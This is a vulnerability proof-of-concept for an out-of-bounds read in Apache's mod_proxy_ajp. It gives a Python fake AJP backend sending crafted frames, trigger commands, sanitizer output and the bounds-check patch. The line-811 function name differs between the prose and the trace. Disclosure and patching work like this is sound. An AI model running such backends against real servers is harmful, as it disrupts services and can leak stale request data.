# PoC 175 — `ajp_msg_get_uint8` Reads at Message End (mod_proxy_ajp)

`ajp_msg_get_uint8()` rejects only `pos > len`, so when `pos == len` it
reads `msg->buf[pos++]`, consuming a byte from outside the declared AJP
message. Combined with reuse of `msg->buf` across requests the read can
return stale data and steer parser dispatch.

## Setup

Module: `mod_proxy_ajp`. Vhost forwards to a malicious AJP backend.

`/tmp/175/httpd.conf`:

```apache
ServerRoot /tmp/175
Listen 127.0.0.1:8175
PidFile  /tmp/175/httpd.pid
ErrorLog /tmp/175/error.log
LoadModule mpm_event_module    modules/mod_mpm_event.so
LoadModule unixd_module        modules/mod_unixd.so
LoadModule authz_core_module   modules/mod_authz_core.so
LoadModule proxy_module        modules/mod_proxy.so
LoadModule proxy_ajp_module    modules/mod_proxy_ajp.so
ProxyPass / ajp://127.0.0.1:8009/
```

### Malicious AJP backend (`/tmp/175/ajp_evil.py`)

The two-frame sequence from the finding:

```python
import socket
srv = socket.socket(); srv.bind(("127.0.0.1", 8009)); srv.listen(1)
c, _ = srv.accept()
_ = c.recv(65536)                                  # drain FORWARD_REQUEST
# Frame 1: valid SEND_BODY_CHUNK with zero-length body.
# Magic 41 42, declared body len 4, opcode 03, body-len 00 00, pad 00.
c.sendall(b"\x41\x42\x00\x04\x03\x00\x00\x00")
# Frame 2: malformed empty AJP packet (declared body len 0).
c.sendall(b"\x41\x42\x00\x00")
c.close()
```

After frame 1, `msg->buf[4]` holds `0x03`. Frame 2 sets
`msg->pos == msg->len == 4` because no body bytes are read.
`ajp_read_header()` at `modules/proxy/ajp_header.c:811` calls
`ajp_msg_get_uint8` once with `pos == len`. The vulnerable check `pos > len`
allows the read; `ajp_msg_get_uint8` returns the stale `0x03`
(`CMD_AJP13_SEND_BODY_CHUNK`) and the parser dispatches a body-chunk
handler on a frame that has no body.

## Trigger

```sh
python3 /tmp/175/ajp_evil.py &
httpd -X -f /tmp/175/httpd.conf &
curl -v http://127.0.0.1:8175/
```

## Observed effect

- AddressSanitizer build flags the read:

  ```text
  ==NN==ERROR: AddressSanitizer: heap-buffer-overflow on address ...
  READ of size 1 at 0x... (msg->buf + 4)
      #0 ajp_msg_get_uint8     modules/proxy/ajp_msg.c:478
      #1 ajp_parse_data        modules/proxy/ajp_header.c:811
  ```

  (When the buffer is allocated exactly to `max_size` the read is
  out-of-bounds; with sub-allocations it is an out-of-message read of
  stale prior-frame data, still semantically wrong.)

- Without ASan: the parser receives stale opcode `0x03` and continues
  parsing a phantom body chunk, then either hands the worker malformed
  data or trips a downstream length check, manifesting as:

  ```text
  [proxy_ajp:error] AH00876: dialog with backend failed
  [proxy_ajp:error] AH00992: read response failed
  ```

  and a `502 Bad Gateway` to the client. Worker state can desynchronise
  with respect to the AJP keepalive pool.

- A buffer-leak variant of the same pattern can return stale bytes from a
  previous request body or response, since `ajp_msg_reuse()` does not
  zero `msg->buf` between frames.

After the patch (`if (msg->pos >= msg->len)`) the same packet sequence
takes the existing `ajp_log_overflow` path with log marker:

```text
[proxy_ajp:error] ajp_msg_get_uint8(): BAD packet signature/format
```

and no read past the declared message end.

## Cleanup

```sh
pkill -f /tmp/175/ajp_evil.py
kill $(cat /tmp/175/httpd.pid) 2>/dev/null
rm -rf /tmp/175
```
